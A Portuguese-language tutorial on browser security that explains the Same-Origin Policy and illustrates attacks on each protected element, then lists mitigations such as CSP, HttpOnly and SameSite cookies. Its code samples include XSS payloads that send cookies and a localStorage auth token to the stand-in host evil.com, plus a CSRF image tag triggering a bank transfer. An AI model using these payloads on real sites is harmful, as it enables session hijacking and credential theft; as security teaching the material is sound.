# Segurança no Navegador

Com o advento do conteúdo dinâmico no navegador, a necessidade de segurança dentro do próprio ambiente de navegação aumentou. Em resposta, foi proposto um modelo de segurança do navegador (Horst & Nordhoff, 2008), cujo objetivo é definir regras claras sobre o que scripts e programas em um site podem ou não acessar em outros domínios.

## Política de Mesma Origem

Uma parte fundamental desse modelo é a **Política de Mesma Origem** (Same-Origin Policy), que estabelece que:

> Scripts no contexto de um local **não** estão autorizados a acessar elementos no contexto de outro site.

### O que a Política de Mesma Origem protege

- **Elementos do documento (DOM)**  
- **Cookies**  
- **XMLHttpRequests**  
- **localStorage** do HTML5  

---

**Referência:**  
Horst, H. & Nordhoff, S. (2008). *[título do trabalho, se disponível]*  


---- 


Aqui vão alguns exemplos práticos de como cada um desses vetores pode ser explorado:

---

## 1. Elementos do documento (DOM)

**Ataque: DOM‑based XSS**
Um atacante injeta um script malicioso que manipula diretamente o DOM da página, sem nunca tocar no servidor:

```html
<!-- Página vulnerável:
     <div id="msg"></div>
     <script>
       // Pega o parâmetro “msg” da URL e injeta no innerHTML
       document.getElementById('msg').innerHTML = location.search.slice(1);
     </script>
-->
```

Se o usuário acessar:

```
https://site-vulneravel.com/?<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

O `<script>` será inserido no DOM e executado no contexto da página, permitindo roubo de dados, cookies etc.

---

## 2. Cookies

**Ataque: Roubo de cookies via XSS**
Um script injetado lê `document.cookie` e envia para o servidor do atacante:

```js
// Em um ponto vulnerável da página...
let i = new Image();
i.src = "https://evil.com/steal?c=" + encodeURIComponent(document.cookie);
```

Com isso, o atacante obtém o cookie de sessão do usuário e pode sequestrar a sessão.

**Outra modalidade: Session Fixation**
O atacante faz o usuário entrar com um cookie de sessão conhecido, depois assume esse ID quando o usuário autentica.

---

## 3. XMLHttpRequests

### a) CSRF (Cross‑Site Request Forgery)

O atacante engana o navegador para que ele dispare uma requisição autorizada (com cookies válidos) a um endpoint sensível:

```html
<!-- Página do atacante -->
<img src="https://banco-quero-roubar.com/transfer?to=attacker&amount=1000" />
```

Como o navegador inclui cookies do banco na requisição, a transferência é efetuada sem o usuário perceber.

### b) CORS mal configurado

Se o servidor define:

```
Access‑Control-Allow-Origin: *
```

Qualquer site poderá ler a resposta de um XHR, mesmo que não seja de confiança.

---

## 4. localStorage do HTML5

**Ataque: XSS para ler e exfiltrar localStorage**
Muitas aplicações guardam tokens JWT ou dados sensíveis em `localStorage`. Um XSS simples faz:

```js
fetch('https://evil.com/exfil', {
  method: 'POST',
  body: JSON.stringify({ token: localStorage.getItem('authToken') })
});
```

O atacante pode então usar esse token para se passar pelo usuário em APIs.

---

### Mitigações comuns

* **CSP (Content Security Policy)**: restringe origens de scripts e bloqueia inline‑scripts
* **HttpOnly/Cookie Secure**: impede acesso a `document.cookie`
* **SameSite=strict**: reduz risco de CSRF
* **Sanitização de entradas**: escapa todo conteúdo injetado no DOM
* **CORS restritivo**: só autoriza domínios confiáveis

Com essas proteções bem configuradas, você cobre a maioria dos vetores de ataque acima.
